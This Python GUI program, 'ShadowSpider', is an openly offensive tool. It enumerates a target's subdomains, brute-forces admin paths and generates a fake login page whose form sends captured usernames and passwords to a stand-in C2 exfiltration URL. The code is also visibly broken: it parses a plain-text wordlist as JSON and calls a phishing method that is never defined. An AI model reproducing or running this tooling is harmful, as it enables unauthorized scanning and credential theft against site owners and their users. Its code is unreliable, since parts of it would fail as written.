#!/usr/bin/env python3
import tkinter as tk
import requests
import threading
import socket
from concurrent.futures import ThreadPoolExecutor
from tkinter import ttk, messagebox, scrolledtext
import sys
import os
import re
import json
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
import dns.resolver
import pyfiglet

# ɢʟᴏʙᴀʟ ᴄᴏɴꜰɪɢ
MAX_THREADS = 50
PHISHING_BAIT = "update_account.html"
EXFIL_URL = "https://evil-c2.example.com/exfil"

class AdvancedWebRecon:
    def __init__(self, master):
        self.master = master
        self.master.title("ShadowSpider v9.11")
        self.master.geometry("1200x800")
        self.setup_gui()
        self.load_resources()
        self.scan_lock = threading.Lock()
        self.active_scans = 0
        
    def setup_gui(self):
        style = ttk.Style()
        style.configure("Red.TButton", foreground="red", font=('Helvetica', 12, 'bold'))
        
        self.main_frame = ttk.Frame(self.master)
        self.main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Recon Controls
        self.setup_input_section()
        self.setup_advanced_controls()
        self.setup_results_tabs()
        self.setup_status_bar()
        
    def setup_input_section(self):
        input_frame = ttk.LabelFrame(self.main_frame, text="Target Acquisition")
        input_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(input_frame, text="Target(s):").grid(row=0, column=0, padx=5)
        self.target_entry = ttk.Entry(input_frame, width=70)
        self.target_entry.grid(row=0, column=1, padx=5, sticky="ew")
        
        self.start_btn = ttk.Button(input_frame, text="Begin Harvest", command=self.initiate_scan, style="Red.TButton")
        self.start_btn.grid(row=0, column=2, padx=5)
        
    def setup_advanced_controls(self):
        adv_frame = ttk.LabelFrame(self.main_frame, text="Black Magic")
        adv_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.subdomain_var = tk.BooleanVar(value=True)
        self.dirbust_var = tk.BooleanVar(value=True)
        self.phish_var = tk.BooleanVar()
        
        ttk.Checkbutton(adv_frame, text="Subdomain Enum", variable=self.subdomain_var).pack(side=tk.LEFT, padx=15)
        ttk.Checkbutton(adv_frame, text="Advanced Dirbust", variable=self.dirbust_var).pack(side=tk.LEFT, padx=15)
        ttk.Checkbutton(adv_frame, text="Phishing Trap", variable=self.phish_var).pack(side=tk.LEFT, padx=15)
        
    def setup_results_tabs(self):
        notebook = ttk.Notebook(self.main_frame)
        notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        self.subdomain_tab = self.create_results_tab(notebook, "Subdomains")
        self.paths_tab = self.create_results_tab(notebook, "Admin Paths")
        self.phish_tab = self.create_phish_tab(notebook)
        
    def create_results_tab(self, parent, name):
        frame = ttk.Frame(parent)
        parent.add(frame, text=name)
        
        tree = ttk.Treeview(frame, columns=("Status", "Details"), show="headings")
        tree.heading("Status", text="Status")
        tree.heading("Details", text="Details")
        vsb = ttk.Scrollbar(frame, orient="vertical", command=tree.yview)
        tree.configure(yscrollcommand=vsb.set)
        
        tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)
        return tree
        
    def create_phish_tab(self, parent):
        frame = ttk.Frame(parent)
        parent.add(frame, text="Phish Harvest")
        
        self.phish_text = scrolledtext.ScrolledText(frame, wrap=tk.WORD)
        self.phish_text.pack(fill=tk.BOTH, expand=True)
        return frame
        
    def setup_status_bar(self):
        self.status_var = tk.StringVar()
        status_bar = ttk.Label(self.master, textvariable=self.status_var, relief=tk.SUNKEN)
        status_bar.pack(side=tk.BOTTOM, fill=tk.X)
        
    def load_resources(self):
        self.subdomains = ["www", "mail", "ftp", "admin", "vpn"]  # Load from file in real impl
        self.admin_paths = json.loads(requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt").text).splitlines()
        
    def initiate_scan(self):
        target = self.target_entry.get().strip()
        if not self.validate_target(target):
            return
            
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            if self.subdomain_var.get():
                executor.submit(self.enumerate_subdomains, target)
            if self.dirbust_var.get():
                executor.submit(self.deep_dirbust, target)
            if self.phish_var.get():
                executor.submit(self.deploy_phishing, target)
                
    def enumerate_subdomains(self, domain):
        base_domain = ".".join(domain.split(".")[-2:])
        for sub in self.subdomains:
            fqdn = f"{sub}.{base_domain}"
            try:
                ip = socket.gethostbyname(fqdn)
                self.log_result(self.subdomain_tab, fqdn, "ALIVE", ip)
                self.deep_dirbust(f"http://{fqdn}")
            except socket.error:
                continue
                
    def deep_dirbust(self, base_url):
        parsed = urlparse(base_url)
        for path in self.admin_paths:
            url = f"{parsed.scheme}://{parsed.netloc}/{path}"
            try:
                resp = requests.get(url, timeout=15, allow_redirects=False)
                if resp.status_code == 200:
                    self.log_result(self.paths_tab, url, "FOUND", self.analyze_response(resp))
                    self.harvest_credentials(url)
            except Exception as e:
                continue
                
    def analyze_response(self, response):
        soup = BeautifulSoup(response.text, 'html.parser')
        if soup.find('input', {'type':'password'}):
            return "LOGIN PAGE"
        if 'admin' in response.url.lower():
            return "ADMIN PORTAL"
        return "INTERESTING"
        
    def harvest_credentials(self, url):
        fake_login = f"""
        <html>
        <form action="{EXFIL_URL}" method="POST">
            <input type="text" name="username">
            <input type="password" name="password">
            <input type="submit" value="Login">
        </form>
        </html>
        """
        with open(PHISHING_BAIT, 'w') as f:
            f.write(fake_login)
            
    def log_result(self, widget, target, status, details):
        self.master.after(0, widget.insert, "", "end", values=(status, details))
        
    def validate_target(self, target):
        pattern = r"^(https?://)?([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}(/\S*)?$"
        if not re.match(pattern, target):
            messagebox.showerror("Invalid Target", "Enter valid domain/URL")
            return False
        return True

if __name__ == "__main__":
    root = tk.Tk()
    app = AdvancedWebRecon(root)
    root.mainloop()
